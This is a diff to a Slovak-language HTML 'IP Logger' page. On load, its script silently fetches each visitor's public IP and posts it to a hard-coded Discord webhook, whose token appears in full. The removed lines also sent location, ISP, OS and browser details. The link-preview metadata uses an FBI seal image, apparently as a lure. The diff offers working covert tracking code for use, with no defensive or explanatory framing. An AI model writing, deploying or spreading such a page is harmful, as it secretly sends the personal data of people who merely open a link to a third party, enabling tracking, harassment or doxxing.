@@ -1,71 +1,41 @@
-<!DOCTYPE html>
-<html lang="sk">
 <head>
   <meta charset="UTF-8" />
-  <title>Advanced IP Logger</title>
+  <title>IP Logger s webhookom</title>
+  
+  <!-- Len obrázok, bez title a description -->
   <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
   <meta property="og:url" content="https://kokotzkanala.github.io/TBO-2.0-Ui/" />
   <meta property="og:type" content="website" />
 </head>
 <body>
-  <h1>Advanced IP Logger</h1>
+  <h1>IP Logger</h1>
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
 
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let device = "Neznáme zariadenie";
-      let os = "Neznámy OS";
-      let browser = "Neznámy prehliadač";
-
-      if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
-      else if (ua.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
-      else if (ua.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
-      else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
-      else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS X";
-      else if (ua.indexOf("Android") !== -1) os = "Android";
-      else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
-
-      if (/Mobi|Android/i.test(ua)) device = "Mobilné zariadenie";
-      else device = "Desktop";
-
-      if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edge") === -1) browser = "Chrome";
-      else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
-      else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
-      else if (ua.indexOf("Edge") !== -1) browser = "Edge";
-      else if (ua.indexOf("OPR") !== -1) browser = "Opera";
-
-      return { device, os, browser };
-    }
-
-    fetch('https://ipinfo.io/json?token=demo')
+    fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        const { ip, city, region, country, org } = data;
-        const { device, os, browser } = getDeviceInfo();
-
-        const message = `
-**Nový návštevník!**
-IP: ${ip}
-Krajina: ${country} (${region}, ${city})
-Poskytovateľ: ${org}
-Zariadenie: ${device}
-Operačný systém: ${os}
-Prehliadač: ${browser}
-        `;
+        const ip = data.ip;
+        console.log("IP návštevníka:", ip);
 
         fetch(webhookURL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: message }),
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `SOMEONE GOT LOGGED! :: ${ip}`
+          }),
         })
         .then(response => {
-          if (response.ok) console.log("Rozšírený log úspešne odoslaný");
-          else console.error("Chyba pri odosielaní rozšíreného logu");
+          if (response.ok) {
+            console.log("IP poslaná na webhook");
+          } else {
+            console.error("Chyba pri posielaní na webhook");
+          }
         })
         .catch(console.error);
       })
       .catch(console.error);
   </script>
 </body>
-</html>
